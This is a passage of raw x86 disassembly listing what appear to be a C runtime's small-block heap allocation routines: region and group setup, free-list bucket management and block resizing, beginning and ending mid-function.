  406a23:	mov    eax,ds:0x40f950
  406a28:	imul   ecx,ecx,0x14
  406a2b:	mov    edx,DWORD PTR ds:0x411410
  406a31:	sub    ecx,eax
  406a33:	lea    ecx,[ecx+edx*1-0x14]
  406a37:	push   ecx
  406a38:	lea    ecx,[eax+0x14]
  406a3b:	push   ecx
  406a3c:	push   eax
  406a3d:	call   0x4098b0
  406a42:	mov    eax,DWORD PTR [ebp+0x8]
  406a45:	add    esp,0xc
  406a48:	dec    DWORD PTR ds:0x41140c
  406a4e:	cmp    eax,DWORD PTR ds:0x40f950
  406a54:	jbe    0x406a5a
  406a56:	sub    DWORD PTR [ebp+0x8],0x14
  406a5a:	mov    eax,ds:0x411410
  406a5f:	mov    ds:0x411418,eax
  406a64:	mov    eax,DWORD PTR [ebp+0x8]
  406a67:	mov    ds:0x40f950,eax
  406a6c:	mov    DWORD PTR ds:0x411420,edi
  406a72:	pop    ebx
  406a73:	pop    edi
  406a74:	pop    esi
  406a75:	leave  
  406a76:	ret    
  406a77:	mov    eax,ds:0x41141c
  406a7c:	push   esi
  406a7d:	mov    esi,DWORD PTR ds:0x41140c
  406a83:	push   edi
  406a84:	xor    edi,edi
  406a86:	cmp    esi,eax
  406a88:	jne    0x406abe
  406a8a:	add    eax,0x10
  406a8d:	imul   eax,eax,0x14
  406a90:	push   eax
  406a91:	push   DWORD PTR ds:0x411410
  406a97:	push   edi
  406a98:	push   DWORD PTR ds:0x40f7b4
  406a9e:	call   DWORD PTR ds:0x40b070
  406aa4:	cmp    eax,edi
  406aa6:	jne    0x406aac
  406aa8:	xor    eax,eax
  406aaa:	jmp    0x406b24
  406aac:	add    DWORD PTR ds:0x41141c,0x10
  406ab3:	mov    esi,DWORD PTR ds:0x41140c
  406ab9:	mov    ds:0x411410,eax
  406abe:	imul   esi,esi,0x14
  406ac1:	add    esi,DWORD PTR ds:0x411410
  406ac7:	push   0x41c4
  406acc:	push   0x8
  406ace:	push   DWORD PTR ds:0x40f7b4
  406ad4:	call   DWORD PTR ds:0x40b078
  406ada:	mov    DWORD PTR [esi+0x10],eax
  406add:	cmp    eax,edi
  406adf:	je     0x406aa8
  406ae1:	push   0x4
  406ae3:	push   0x2000
  406ae8:	push   0x100000
  406aed:	push   edi
  406aee:	call   DWORD PTR ds:0x40b074
  406af4:	mov    DWORD PTR [esi+0xc],eax
  406af7:	cmp    eax,edi
  406af9:	jne    0x406b0d
  406afb:	push   DWORD PTR [esi+0x10]
  406afe:	push   edi
  406aff:	push   DWORD PTR ds:0x40f7b4
  406b05:	call   DWORD PTR ds:0x40b0b4
  406b0b:	jmp    0x406aa8
  406b0d:	or     DWORD PTR [esi+0x8],0xffffffff
  406b11:	mov    DWORD PTR [esi],edi
  406b13:	mov    DWORD PTR [esi+0x4],edi
  406b16:	inc    DWORD PTR ds:0x41140c
  406b1c:	mov    eax,DWORD PTR [esi+0x10]
  406b1f:	or     DWORD PTR [eax],0xffffffff
  406b22:	mov    eax,esi
  406b24:	pop    edi
  406b25:	pop    esi
  406b26:	ret    
  406b27:	mov    edi,edi
  406b29:	push   ebp
  406b2a:	mov    ebp,esp
  406b2c:	push   ecx
  406b2d:	push   ecx
  406b2e:	mov    ecx,DWORD PTR [ebp+0x8]
  406b31:	mov    eax,DWORD PTR [ecx+0x8]
  406b34:	push   ebx
  406b35:	push   esi
  406b36:	mov    esi,DWORD PTR [ecx+0x10]
  406b39:	push   edi
  406b3a:	xor    ebx,ebx
  406b3c:	jmp    0x406b41
  406b3e:	add    eax,eax
  406b40:	inc    ebx
  406b41:	test   eax,eax
  406b43:	jge    0x406b3e
  406b45:	mov    eax,ebx
  406b47:	imul   eax,eax,0x204
  406b4d:	lea    eax,[eax+esi*1+0x144]
  406b54:	push   0x3f
  406b56:	mov    DWORD PTR [ebp-0x8],eax
  406b59:	pop    edx
  406b5a:	mov    DWORD PTR [eax+0x8],eax
  406b5d:	mov    DWORD PTR [eax+0x4],eax
  406b60:	add    eax,0x8
  406b63:	dec    edx
  406b64:	jne    0x406b5a
  406b66:	push   0x4
  406b68:	mov    edi,ebx
  406b6a:	push   0x1000
  406b6f:	shl    edi,0xf
  406b72:	add    edi,DWORD PTR [ecx+0xc]
  406b75:	push   0x8000
  406b7a:	push   edi
  406b7b:	call   DWORD PTR ds:0x40b074
  406b81:	test   eax,eax
  406b83:	jne    0x406b8d
  406b85:	or     eax,0xffffffff
  406b88:	jmp    0x406c2a
  406b8d:	lea    edx,[edi+0x7000]
  406b93:	mov    DWORD PTR [ebp-0x4],edx
  406b96:	cmp    edi,edx
  406b98:	ja     0x406bdd
  406b9a:	mov    ecx,edx
  406b9c:	sub    ecx,edi
  406b9e:	shr    ecx,0xc
  406ba1:	lea    eax,[edi+0x10]
  406ba4:	inc    ecx
  406ba5:	or     DWORD PTR [eax-0x8],0xffffffff
  406ba9:	or     DWORD PTR [eax+0xfec],0xffffffff
  406bb0:	lea    edx,[eax+0xffc]
  406bb6:	mov    DWORD PTR [eax],edx
  406bb8:	lea    edx,[eax-0x1004]
  406bbe:	mov    DWORD PTR [eax-0x4],0xff0
  406bc5:	mov    DWORD PTR [eax+0x4],edx
  406bc8:	mov    DWORD PTR [eax+0xfe8],0xff0
  406bd2:	add    eax,0x1000
  406bd7:	dec    ecx
  406bd8:	jne    0x406ba5
  406bda:	mov    edx,DWORD PTR [ebp-0x4]
  406bdd:	mov    eax,DWORD PTR [ebp-0x8]
  406be0:	add    eax,0x1f8
  406be5:	lea    ecx,[edi+0xc]
  406be8:	mov    DWORD PTR [eax+0x4],ecx
  406beb:	mov    DWORD PTR [ecx+0x8],eax
  406bee:	lea    ecx,[edx+0xc]
  406bf1:	mov    DWORD PTR [eax+0x8],ecx
  406bf4:	mov    DWORD PTR [ecx+0x4],eax
  406bf7:	and    DWORD PTR [esi+ebx*4+0x44],0x0
  406bfc:	xor    edi,edi
  406bfe:	inc    edi
  406bff:	mov    DWORD PTR [esi+ebx*4+0xc4],edi
  406c06:	mov    al,BYTE PTR [esi+0x43]
  406c09:	mov    cl,al
  406c0b:	inc    cl
  406c0d:	test   al,al
  406c0f:	mov    eax,DWORD PTR [ebp+0x8]
  406c12:	mov    BYTE PTR [esi+0x43],cl
  406c15:	jne    0x406c1a
  406c17:	or     DWORD PTR [eax+0x4],edi
  406c1a:	mov    edx,0x80000000
  406c1f:	mov    ecx,ebx
  406c21:	shr    edx,cl
  406c23:	not    edx
  406c25:	and    DWORD PTR [eax+0x8],edx
  406c28:	mov    eax,ebx
  406c2a:	pop    edi
  406c2b:	pop    esi
  406c2c:	pop    ebx
  406c2d:	leave  
  406c2e:	ret    
  406c2f:	mov    edi,edi
  406c31:	push   ebp
  406c32:	mov    ebp,esp
  406c34:	sub    esp,0xc
  406c37:	mov    ecx,DWORD PTR [ebp+0x8]
  406c3a:	mov    eax,DWORD PTR [ecx+0x10]
  406c3d:	push   ebx
  406c3e:	push   esi
  406c3f:	mov    esi,DWORD PTR [ebp+0x10]
  406c42:	push   edi
  406c43:	mov    edi,DWORD PTR [ebp+0xc]
  406c46:	mov    edx,edi
  406c48:	sub    edx,DWORD PTR [ecx+0xc]
  406c4b:	add    esi,0x17
  406c4e:	shr    edx,0xf
  406c51:	mov    ecx,edx
  406c53:	imul   ecx,ecx,0x204
  406c59:	lea    ecx,[ecx+eax*1+0x144]
  406c60:	mov    DWORD PTR [ebp-0xc],ecx
  406c63:	mov    ecx,DWORD PTR [edi-0x4]
  406c66:	and    esi,0xfffffff0
  406c69:	dec    ecx
  406c6a:	cmp    esi,ecx
  406c6c:	lea    edi,[ecx+edi*1-0x4]
  406c70:	mov    ebx,DWORD PTR [edi]
  406c72:	mov    DWORD PTR [ebp+0x10],ecx
  406c75:	mov    DWORD PTR [ebp-0x4],ebx
  406c78:	jle    0x406dd3
  406c7e:	test   bl,0x1
  406c81:	jne    0x406dcc
  406c87:	add    ebx,ecx
  406c89:	cmp    esi,ebx
  406c8b:	jg     0x406dcc
  406c91:	mov    ecx,DWORD PTR [ebp-0x4]
  406c94:	sar    ecx,0x4
  406c97:	dec    ecx
  406c98:	mov    DWORD PTR [ebp-0x8],ecx
  406c9b:	cmp    ecx,0x3f
  406c9e:	jbe    0x406ca6
  406ca0:	push   0x3f
  406ca2:	pop    ecx
  406ca3:	mov    DWORD PTR [ebp-0x8],ecx
  406ca6:	mov    ebx,DWORD PTR [edi+0x4]
  406ca9:	cmp    ebx,DWORD PTR [edi+0x8]
  406cac:	jne    0x406cf1
  406cae:	mov    ebx,0x80000000
  406cb3:	cmp    ecx,0x20
  406cb6:	jae    0x406cd2
  406cb8:	shr    ebx,cl
  406cba:	mov    ecx,DWORD PTR [ebp-0x8]
  406cbd:	lea    ecx,[ecx+eax*1+0x4]
  406cc1:	not    ebx
  406cc3:	and    DWORD PTR [eax+edx*4+0x44],ebx
  406cc7:	dec    BYTE PTR [ecx]
  406cc9:	jne    0x406cf1
  406ccb:	mov    ecx,DWORD PTR [ebp+0x8]
  406cce:	and    DWORD PTR [ecx],ebx
  406cd0:	jmp    0x406cf1
  406cd2:	add    ecx,0xffffffe0
  406cd5:	shr    ebx,cl
  406cd7:	mov    ecx,DWORD PTR [ebp-0x8]
  406cda:	lea    ecx,[ecx+eax*1+0x4]
  406cde:	not    ebx
  406ce0:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  406ce7:	dec    BYTE PTR [ecx]
  406ce9:	jne    0x406cf1
  406ceb:	mov    ecx,DWORD PTR [ebp+0x8]
  406cee:	and    DWORD PTR [ecx+0x4],ebx
  406cf1:	mov    ecx,DWORD PTR [edi+0x8]
  406cf4:	mov    ebx,DWORD PTR [edi+0x4]
  406cf7:	mov    DWORD PTR [ecx+0x4],ebx
  406cfa:	mov    ecx,DWORD PTR [edi+0x4]
  406cfd:	mov    edi,DWORD PTR [edi+0x8]
  406d00:	mov    DWORD PTR [ecx+0x8],edi
  406d03:	mov    ecx,DWORD PTR [ebp+0x10]
  406d06:	sub    ecx,esi
  406d08:	add    DWORD PTR [ebp-0x4],ecx
  406d0b:	cmp    DWORD PTR [ebp-0x4],0x0
  406d0f:	jle    0x406dba
  406d15:	mov    edi,DWORD PTR [ebp-0x4]
  406d18:	mov    ecx,DWORD PTR [ebp+0xc]
  406d1b:	sar    edi,0x4
  406d1e:	dec    edi
  406d1f:	lea    ecx,[ecx+esi*1-0x4]
  406d23:	cmp    edi,0x3f
  406d26:	jbe    0x406d2b
  406d28:	push   0x3f
  406d2a:	pop    edi
  406d2b:	mov    ebx,DWORD PTR [ebp-0xc]
  406d2e:	lea    ebx,[ebx+edi*8]
  406d31:	mov    DWORD PTR [ebp+0x10],ebx
  406d34:	mov    ebx,DWORD PTR [ebx+0x4]
  406d37:	mov    DWORD PTR [ecx+0x4],ebx
  406d3a:	mov    ebx,DWORD PTR [ebp+0x10]
  406d3d:	mov    DWORD PTR [ecx+0x8],ebx
  406d40:	mov    DWORD PTR [ebx+0x4],ecx
  406d43:	mov    ebx,DWORD PTR [ecx+0x4]
  406d46:	mov    DWORD PTR [ebx+0x8],ecx
  406d49:	mov    ebx,DWORD PTR [ecx+0x4]
  406d4c:	cmp    ebx,DWORD PTR [ecx+0x8]
  406d4f:	jne    0x406da8
  406d51:	mov    cl,BYTE PTR [edi+eax*1+0x4]
  406d55:	mov    BYTE PTR [ebp+0x13],cl
  406d58:	inc    cl
  406d5a:	mov    BYTE PTR [edi+eax*1+0x4],cl
  406d5e:	cmp    edi,0x20
  406d61:	jae    0x406d7f
  406d63:	cmp    BYTE PTR [ebp+0x13],0x0
  406d67:	jne    0x406d77
  406d69:	mov    ecx,edi
  406d6b:	mov    ebx,0x80000000
  406d70:	shr    ebx,cl
  406d72:	mov    ecx,DWORD PTR [ebp+0x8]
  406d75:	or     DWORD PTR [ecx],ebx
  406d77:	lea    eax,[eax+edx*4+0x44]
  406d7b:	mov    ecx,edi
  406d7d:	jmp    0x406d9f
  406d7f:	cmp    BYTE PTR [ebp+0x13],0x0
  406d83:	jne    0x406d95
  406d85:	lea    ecx,[edi-0x20]
  406d88:	mov    ebx,0x80000000
  406d8d:	shr    ebx,cl
  406d8f:	mov    ecx,DWORD PTR [ebp+0x8]
  406d92:	or     DWORD PTR [ecx+0x4],ebx
  406d95:	lea    eax,[eax+edx*4+0xc4]
  406d9c:	lea    ecx,[edi-0x20]
  406d9f:	mov    edx,0x80000000
  406da4:	shr    edx,cl
  406da6:	or     DWORD PTR [eax],edx
  406da8:	mov    edx,DWORD PTR [ebp+0xc]
  406dab:	mov    ecx,DWORD PTR [ebp-0x4]
  406dae:	lea    eax,[edx+esi*1-0x4]
  406db2:	mov    DWORD PTR [eax],ecx
  406db4:	mov    DWORD PTR [ecx+eax*1-0x4],ecx
  406db8:	jmp    0x406dbd
  406dba:	mov    edx,DWORD PTR [ebp+0xc]
  406dbd:	lea    eax,[esi+0x1]
  406dc0:	mov    DWORD PTR [edx-0x4],eax
  406dc3:	mov    DWORD PTR [edx+esi*1-0x8],eax
  406dc7:	jmp    0x406f08
  406dcc:	xor    eax,eax
  406dce:	jmp    0x406f0b
  406dd3:	jge    0x406f08
  406dd9:	mov    ebx,DWORD PTR [ebp+0xc]
  406ddc:	sub    DWORD PTR [ebp+0x10],esi
  406ddf:	lea    ecx,[esi+0x1]
  406de2:	mov    DWORD PTR [ebx-0x4],ecx
  406de5:	lea    ebx,[ebx+esi*1-0x4]
  406de9:	mov    esi,DWORD PTR [ebp+0x10]
  406dec:	sar    esi,0x4
  406def:	dec    esi
  406df0:	mov    DWORD PTR [ebp+0xc],ebx
  406df3:	mov    DWORD PTR [ebx-0x4],ecx
  406df6:	cmp    esi,0x3f
  406df9:	jbe    0x406dfe
  406dfb:	push   0x3f
  406dfd:	pop    esi
  406dfe:	test   BYTE PTR [ebp-0x4],0x1
  406e02:	jne    0x406e88
  406e08:	mov    esi,DWORD PTR [ebp-0x4]
  406e0b:	sar    esi,0x4
  406e0e:	dec    esi
  406e0f:	cmp    esi,0x3f
  406e12:	jbe    0x406e17
  406e14:	push   0x3f
  406e16:	pop    esi
  406e17:	mov    ecx,DWORD PTR [edi+0x4]
  406e1a:	cmp    ecx,DWORD PTR [edi+0x8]
  406e1d:	jne    0x406e61
  406e1f:	mov    ebx,0x80000000
  406e24:	cmp    esi,0x20
  406e27:	jae    0x406e42
  406e29:	mov    ecx,esi
  406e2b:	shr    ebx,cl
  406e2d:	lea    esi,[esi+eax*1+0x4]
  406e31:	not    ebx
  406e33:	and    DWORD PTR [eax+edx*4+0x44],ebx
  406e37:	dec    BYTE PTR [esi]
  406e39:	jne    0x406e5e
  406e3b:	mov    ecx,DWORD PTR [ebp+0x8]
  406e3e:	and    DWORD PTR [ecx],ebx
  406e40:	jmp    0x406e5e
  406e42:	lea    ecx,[esi-0x20]
  406e45:	shr    ebx,cl
  406e47:	lea    ecx,[esi+eax*1+0x4]
  406e4b:	not    ebx
  406e4d:	and    DWORD PTR [eax+edx*4+0xc4],ebx
  406e54:	dec    BYTE PTR [ecx]
  406e56:	jne    0x406e5e
  406e58:	mov    ecx,DWORD PTR [ebp+0x8]
  406e5b:	and    DWORD PTR [ecx+0x4],ebx
  406e5e:	mov    ebx,DWORD PTR [ebp+0xc]
  406e61:	mov    ecx,DWORD PTR [edi+0x8]
  406e64:	mov    esi,DWORD PTR [edi+0x4]
  406e67:	mov    DWORD PTR [ecx+0x4],esi
  406e6a:	mov    esi,DWORD PTR [edi+0x8]
  406e6d:	mov    ecx,DWORD PTR [edi+0x4]
  406e70:	mov    DWORD PTR [ecx+0x8],esi
  406e73:	mov    esi,DWORD PTR [ebp+0x10]
  406e76:	add    esi,DWORD PTR [ebp-0x4]
  406e79:	mov    DWORD PTR [ebp+0x10],esi
  406e7c:	sar    esi,0x4
  406e7f:	dec    esi
  406e80:	cmp    esi,0x3f
  406e83:	jbe    0x406e88
  406e85:	push   0x3f
  406e87:	pop    esi
  406e88:	mov    ecx,DWORD PTR [ebp-0xc]
  406e8b:	lea    ecx,[ecx+esi*8]
  406e8e:	mov    edi,DWORD PTR [ecx+0x4]
  406e91:	mov    DWORD PTR [ebx+0x8],ecx
  406e94:	mov    DWORD PTR [ebx+0x4],edi
  406e97:	mov    DWORD PTR [ecx+0x4],ebx
  406e9a:	mov    ecx,DWORD PTR [ebx+0x4]
  406e9d:	mov    DWORD PTR [ecx+0x8],ebx
  406ea0:	mov    ecx,DWORD PTR [ebx+0x4]
  406ea3:	cmp    ecx,DWORD PTR [ebx+0x8]
  406ea6:	jne    0x406eff
  406ea8:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  406eac:	mov    BYTE PTR [ebp+0xf],cl
  406eaf:	inc    cl
  406eb1:	mov    BYTE PTR [esi+eax*1+0x4],cl
  406eb5:	cmp    esi,0x20
  406eb8:	jae    0x406ed6
  406eba:	cmp    BYTE PTR [ebp+0xf],0x0
  406ebe:	jne    0x406ece
  406ec0:	mov    ecx,esi
  406ec2:	mov    edi,0x80000000
  406ec7:	shr    edi,cl
  406ec9:	mov    ecx,DWORD PTR [ebp+0x8]
  406ecc:	or     DWORD PTR [ecx],edi
  406ece:	lea    eax,[eax+edx*4+0x44]
  406ed2:	mov    ecx,esi
  406ed4:	jmp    0x406ef6
  406ed6:	cmp    BYTE PTR [ebp+0xf],0x0
  406eda:	jne    0x406eec
  406edc:	lea    ecx,[esi-0x20]
  406edf:	mov    edi,0x80000000
  406ee4:	shr    edi,cl
  406ee6:	mov    ecx,DWORD PTR [ebp+0x8]
  406ee9:	or     DWORD PTR [ecx+0x4],edi
  406eec:	lea    eax,[eax+edx*4+0xc4]
  406ef3:	lea    ecx,[esi-0x20]
  406ef6:	mov    edx,0x80000000
  406efb:	shr    edx,cl
  406efd:	or     DWORD PTR [eax],edx
  406eff:	mov    eax,DWORD PTR [ebp+0x10]
  406f02:	mov    DWORD PTR [ebx],eax
  406f04:	mov    DWORD PTR [eax+ebx*1-0x4],eax
  406f08:	xor    eax,eax
  406f0a:	inc    eax
  406f0b:	pop    edi
  406f0c:	pop    esi
  406f0d:	pop    ebx
  406f0e:	leave  
  406f0f:	ret    
  406f10:	int3   
  406f11:	int3   
  406f12:	int3   
  406f13:	mov    edi,edi
  406f15:	push   ebp
  406f16:	mov    ebp,esp
  406f18:	sub    esp,0x14
  406f1b:	mov    eax,ds:0x41140c
  406f20:	mov    ecx,DWORD PTR [ebp+0x8]
  406f23:	imul   eax,eax,0x14
  406f26:	add    eax,DWORD PTR ds:0x411410
  406f2c:	add    ecx,0x17
  406f2f:	and    ecx,0xfffffff0
  406f32:	mov    DWORD PTR [ebp-0x10],ecx
  406f35:	sar    ecx,0x4
  406f38:	push   ebx
  406f39:	dec    ecx
  406f3a:	cmp    ecx,0x20
  406f3d:	push   esi
  406f3e:	push   edi
  406f3f:	jge    0x406f4c
  406f41:	or     esi,0xffffffff
  406f44:	shr    esi,cl
  406f46:	or     DWORD PTR [ebp-0x8],0xffffffff
  406f4a:	jmp    0x406f59
  406f4c:	add    ecx,0xffffffe0
  406f4f:	or     edx,0xffffffff
  406f52:	xor    esi,esi
  406f54:	shr    edx,cl
  406f56:	mov    DWORD PTR [ebp-0x8],edx
  406f59:	mov    ecx,DWORD PTR ds:0x411418
  406f5f:	mov    ebx,ecx
  406f61:	jmp    0x406f74
  406f63:	mov    edx,DWORD PTR [ebx+0x4]
  406f66:	mov    edi,DWORD PTR [ebx]
  406f68:	and    edx,DWORD PTR [ebp-0x8]
  406f6b:	and    edi,esi
  406f6d:	or     edx,edi
  406f6f:	jne    0x406f7b
  406f71:	add    ebx,0x14
  406f74:	mov    DWORD PTR [ebp+0x8],ebx
  406f77:	cmp    ebx,eax
  406f79:	jb     0x406f63
  406f7b:	cmp    ebx,eax
  406f7d:	jne    0x406ffe
  406f7f:	mov    ebx,DWORD PTR ds:0x411410
  406f85:	jmp    0x406f98
  406f87:	mov    edx,DWORD PTR [ebx+0x4]
  406f8a:	mov    edi,DWORD PTR [ebx]
  406f8c:	and    edx,DWORD PTR [ebp-0x8]
  406f8f:	and    edi,esi
  406f91:	or     edx,edi
  406f93:	jne    0x406f9f
  406f95:	add    ebx,0x14
  406f98:	mov    DWORD PTR [ebp+0x8],ebx
  406f9b:	cmp    ebx,ecx
  406f9d:	jb     0x406f87
  406f9f:	cmp    ebx,ecx
  406fa1:	jne    0x406ffe
  406fa3:	jmp    0x406fb1
  406fa5:	cmp    DWORD PTR [ebx+0x8],0x0
  406fa9:	jne    0x406fb5
  406fab:	add    ebx,0x14
  406fae:	mov    DWORD PTR [ebp+0x8],ebx
  406fb1:	cmp    ebx,eax
  406fb3:	jb     0x406fa5
  406fb5:	cmp    ebx,eax
  406fb7:	jne    0x406fea
  406fb9:	mov    ebx,DWORD PTR ds:0x411410
  406fbf:	jmp    0x406fca
  406fc1:	cmp    DWORD PTR [ebx+0x8],0x0
  406fc5:	jne    0x406fd1
  406fc7:	add    ebx,0x14
  406fca:	mov    DWORD PTR [ebp+0x8],ebx
  406fcd:	cmp    ebx,ecx
  406fcf:	jb     0x406fc1
  406fd1:	cmp    ebx,ecx
  406fd3:	jne    0x406fea
  406fd5:	call   0x406a77
  406fda:	mov    ebx,eax
  406fdc:	mov    DWORD PTR [ebp+0x8],ebx
  406fdf:	test   ebx,ebx
  406fe1:	jne    0x406fea
  406fe3:	xor    eax,eax
  406fe5:	jmp    0x4071f3
  406fea:	push   ebx
  406feb:	call   0x406b27
  406ff0:	pop    ecx
  406ff1:	mov    ecx,DWORD PTR [ebx+0x10]
  406ff4:	mov    DWORD PTR [ecx],eax
  406ff6:	mov    eax,DWORD PTR [ebx+0x10]
  406ff9:	cmp    DWORD PTR [eax],0xffffffff
  406ffc:	je     0x406fe3
  406ffe:	mov    DWORD PTR ds:0x411418,ebx
  407004:	mov    eax,DWORD PTR [ebx+0x10]
  407007:	mov    edx,DWORD PTR [eax]
  407009:	mov    DWORD PTR [ebp-0x4],edx
  40700c:	cmp    edx,0xffffffff
  40700f:	je     0x407025
  407011:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  407018:	mov    edi,DWORD PTR [eax+edx*4+0x44]
  40701c:	and    ecx,DWORD PTR [ebp-0x8]
  40701f:	and    edi,esi
  407021:	or     ecx,edi
  407023:	jne    0x40704e
  407025:	and    DWORD PTR [ebp-0x4],0x0
  407029:	mov    edx,DWORD PTR [eax+0xc4]
  40702f:	lea    ecx,[eax+0x44]
  407032:	mov    edi,DWORD PTR [ecx]
  407034:	and    edx,DWORD PTR [ebp-0x8]
  407037:	and    edi,esi
  407039:	or     edx,edi
  40703b:	jne    0x40704b
  40703d:	inc    DWORD PTR [ebp-0x4]
  407040:	mov    edx,DWORD PTR [ecx+0x84]
  407046:	add    ecx,0x4
  407049:	jmp    0x407032
  40704b:	mov    edx,DWORD PTR [ebp-0x4]
  40704e:	mov    ecx,edx
  407050:	imul   ecx,ecx,0x204
  407056:	lea    ecx,[ecx+eax*1+0x144]
  40705d:	mov    DWORD PTR [ebp-0xc],ecx
  407060:	mov    ecx,DWORD PTR [eax+edx*4+0x44]
  407064:	xor    edi,edi
  407066:	and    ecx,esi
  407068:	jne    0x40707c
  40706a:	mov    ecx,DWORD PTR [eax+edx*4+0xc4]
  407071:	and    ecx,DWORD PTR [ebp-0x8]
  407074:	push   0x20
  407076:	pop    edi
  407077:	jmp    0x40707c
  407079:	add    ecx,ecx
  40707b:	inc    edi
  40707c:	test   ecx,ecx
  40707e:	jge    0x407079
  407080:	mov    ecx,DWORD PTR [ebp-0xc]
  407083:	mov    edx,DWORD PTR [ecx+edi*8+0x4]
  407087:	mov    ecx,DWORD PTR [edx]
  407089:	sub    ecx,DWORD PTR [ebp-0x10]
  40708c:	mov    esi,ecx
  40708e:	sar    esi,0x4
  407091:	dec    esi
  407092:	cmp    esi,0x3f
  407095:	mov    DWORD PTR [ebp-0x8],ecx
  407098:	jle    0x40709d
  40709a:	push   0x3f
  40709c:	pop    esi
  40709d:	cmp    esi,edi
  40709f:	je     0x4071a6
  4070a5:	mov    ecx,DWORD PTR [edx+0x4]
  4070a8:	cmp    ecx,DWORD PTR [edx+0x8]
  4070ab:	jne    0x407109
  4070ad:	cmp    edi,0x20
  4070b0:	mov    ebx,0x80000000
  4070b5:	jge    0x4070dd
  4070b7:	mov    ecx,edi
  4070b9:	shr    ebx,cl
  4070bb:	mov    ecx,DWORD PTR [ebp-0x4]
  4070be:	lea    edi,[eax+edi*1+0x4]
  4070c2:	not    ebx
  4070c4:	mov    DWORD PTR [ebp-0x14],ebx
  4070c7:	and    ebx,DWORD PTR [eax+ecx*4+0x44]
  4070cb:	mov    DWORD PTR [eax+ecx*4+0x44],ebx
  4070cf:	dec    BYTE PTR [edi]
  4070d1:	jne    0x407106
  4070d3:	mov    ecx,DWORD PTR [ebp-0x14]
  4070d6:	mov    ebx,DWORD PTR [ebp+0x8]
  4070d9:	and    DWORD PTR [ebx],ecx
  4070db:	jmp    0x407109
  4070dd:	lea    ecx,[edi-0x20]
  4070e0:	shr    ebx,cl
  4070e2:	mov    ecx,DWORD PTR [ebp-0x4]
  4070e5:	lea    ecx,[eax+ecx*4+0xc4]
  4070ec:	lea    edi,[eax+edi*1+0x4]
  4070f0:	not    ebx
  4070f2:	and    DWORD PTR [ecx],ebx
  4070f4:	dec    BYTE PTR [edi]
  4070f6:	mov    DWORD PTR [ebp-0x14],ebx
  4070f9:	jne    0x407106
  4070fb:	mov    ebx,DWORD PTR [ebp+0x8]
  4070fe:	mov    ecx,DWORD PTR [ebp-0x14]
  407101:	and    DWORD PTR [ebx+0x4],ecx
  407104:	jmp    0x407109
  407106:	mov    ebx,DWORD PTR [ebp+0x8]
  407109:	cmp    DWORD PTR [ebp-0x8],0x0
  40710d:	mov    ecx,DWORD PTR [edx+0x8]
  407110:	mov    edi,DWORD PTR [edx+0x4]
  407113:	mov    DWORD PTR [ecx+0x4],edi
  407116:	mov    ecx,DWORD PTR [edx+0x4]
  407119:	mov    edi,DWORD PTR [edx+0x8]
  40711c:	mov    DWORD PTR [ecx+0x8],edi
  40711f:	je     0x4071b2
  407125:	mov    ecx,DWORD PTR [ebp-0xc]
  407128:	lea    ecx,[ecx+esi*8]
  40712b:	mov    edi,DWORD PTR [ecx+0x4]
  40712e:	mov    DWORD PTR [edx+0x8],ecx
  407131:	mov    DWORD PTR [edx+0x4],edi
  407134:	mov    DWORD PTR [ecx+0x4],edx
  407137:	mov    ecx,DWORD PTR [edx+0x4]
  40713a:	mov    DWORD PTR [ecx+0x8],edx
  40713d:	mov    ecx,DWORD PTR [edx+0x4]
  407140:	cmp    ecx,DWORD PTR [edx+0x8]
  407143:	jne    0x4071a3
  407145:	mov    cl,BYTE PTR [esi+eax*1+0x4]
  407149:	mov    BYTE PTR [ebp+0xb],cl
  40714c:	inc    cl
  40714e:	cmp    esi,0x20
  407151:	mov    BYTE PTR [esi+eax*1+0x4],cl
  407155:	jge    0x40717a
  407157:	cmp    BYTE PTR [ebp+0xb],0x0
  40715b:	jne    0x407168
  40715d:	mov    edi,0x80000000
  407162:	mov    ecx,esi
  407164:	shr    edi,cl
  407166:	or     DWORD PTR [ebx],edi
  407168:	mov    ecx,esi
  40716a:	mov    edi,0x80000000
  40716f:	shr    edi,cl
  407171:	mov    ecx,DWORD PTR [ebp-0x4]
  407174:	or     DWORD PTR [eax+ecx*4+0x44],edi
  407178:	jmp    0x4071a3
  40717a:	cmp    BYTE PTR [ebp+0xb],0x0
  40717e:	jne    0x40718d
  407180:	lea    ecx,[esi-0x20]
  407183:	mov    edi,0x80000000
  407188:	shr    edi,cl
  40718a:	or     DWORD PTR [ebx+0x4],edi
  40718d:	mov    ecx,DWORD PTR [ebp-0x4]
  407190:	lea    edi,[eax+ecx*4+0xc4]
  407197:	lea    ecx,[esi-0x20]
  40719a:	mov    esi,0x80000000
  40719f:	shr    esi,cl
  4071a1:	or     DWORD PTR [edi],esi
  4071a3:	mov    ecx,DWORD PTR [ebp-0x8]
  4071a6:	test   ecx,ecx
  4071a8:	je     0x4071b5
  4071aa:	mov    DWORD PTR [edx],ecx
  4071ac:	mov    DWORD PTR [ecx+edx*1-0x4],ecx
  4071b0:	jmp    0x4071b5
  4071b2:	mov    ecx,DWORD PTR [ebp-0x8]
  4071b5:	mov    esi,DWORD PTR [ebp-0x10]
  4071b8:	add    edx,ecx
  4071ba:	lea    ecx,[esi+0x1]
  4071bd:	mov    DWORD PTR [edx],ecx
  4071bf:	mov    DWORD PTR [edx+esi*1-0x4],ecx
  4071c3:	mov    esi,DWORD PTR [ebp-0xc]
  4071c6:	mov    ecx,DWORD PTR [esi]
  4071c8:	lea    edi,[ecx+0x1]
  4071cb:	mov    DWORD PTR [esi],edi
  4071cd:	test   ecx,ecx
  4071cf:	jne    0x4071eb
  4071d1:	cmp    ebx,DWORD PTR ds:0x40f950
  4071d7:	jne    0x4071eb
  4071d9:	mov    ecx,DWORD PTR [ebp-0x4]
  4071dc:	cmp    ecx,DWORD PTR ds:0x411420
  4071e2:	jne    0x4071eb
  4071e4:	and    DWORD PTR ds:0x40f950,0x0
  4071eb:	mov    ecx,DWORD PTR [ebp-0x4]
  4071ee:	mov    DWORD PTR [eax],ecx
  4071f0:	lea    eax,[edx+0x4]
  4071f3:	pop    edi
  4071f4:	pop    esi
  4071f5:	pop    ebx
  4071f6:	leave  
  4071f7:	ret    
  4071f8:	mov    edi,edi
  4071fa:	push   ebp
  4071fb:	mov    ebp,esp
  4071fd:	sub    esp,0x10
  407200:	push   DWORD PTR [ebp+0x8]
  407203:	lea    ecx,[ebp-0x10]
  407206:	call   0x402290
  40720b:	mov    eax,DWORD PTR [ebp+0x18]
  40720e:	test   eax,eax
  407210:	jle    0x40722a
